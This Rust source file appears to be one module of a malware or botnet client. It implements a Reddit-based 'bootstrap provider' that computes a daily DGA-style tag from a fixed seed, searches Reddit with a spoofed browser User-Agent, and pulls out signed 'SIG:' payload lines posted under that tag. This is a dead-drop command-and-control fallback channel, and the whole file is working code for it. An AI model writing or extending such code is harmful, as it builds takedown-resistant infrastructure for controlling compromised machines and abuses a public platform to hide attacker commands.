use std::error::Error;
use std::time::{SystemTime, UNIX_EPOCH};
use log::debug;
use serde::Deserialize;
use super::BootstrapProvider;

/// Reddit Backup Provider (Tier 2.5)
/// Searches for DGA-derived tags on Reddit comments/posts
pub struct RedditProvider;

impl RedditProvider {
    fn generate_tag(&self) -> String {
        let start = SystemTime::now();
        let seconds = start.duration_since(UNIX_EPOCH).unwrap().as_secs();
        let day_slot = seconds / 86400;
        
        let seed: u64 = 0x36A5EC9D09C60386;
        let mut state = day_slot ^ seed;
        state ^= state << 13;
        state ^= state >> 7;
        state ^= state << 17;
        
        format!("phantom-{:x}", state & 0xFFFF) 
    }
}

#[derive(Deserialize)]
struct RedditListing {
    data: RedditData,
}

#[derive(Deserialize)]
struct RedditData {
    children: Vec<RedditChild>,
}

#[derive(Deserialize)]
struct RedditChild {
    data: RedditContent,
}

#[derive(Deserialize)]
struct RedditContent {
    selftext: Option<String>,
    body: Option<String>,
}

impl BootstrapProvider for RedditProvider {
    fn fetch_payload(&self) -> Result<String, Box<dyn Error + Send + Sync>> {
        let tag = self.generate_tag();
        debug!("[Bootstrap] Reddit Searching Tag: {}", tag);
        
        let url = format!("https://www.reddit.com/search.json?q={}&sort=new&limit=5", tag);
        
        let resp: RedditListing = ureq::get(&url)
            .timeout(std::time::Duration::from_secs(15))
            .set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
            .call()?
            .into_json()?;

        for child in resp.data.children {
            let content = child.data.selftext.or(child.data.body).unwrap_or_default();
            
            if content.contains("SIG:") && content.contains("MSG:") {
                 for line in content.lines() {
                     if line.contains("SIG:") {
                         return Ok(line.trim().to_string());
                     }
                 }
            }
        }
        
        Err(format!("No signed payload found for tag {}", tag).into())
    }

    fn name(&self) -> String {
        "Reddit(Tier 2.5)".to_string()
    }
}
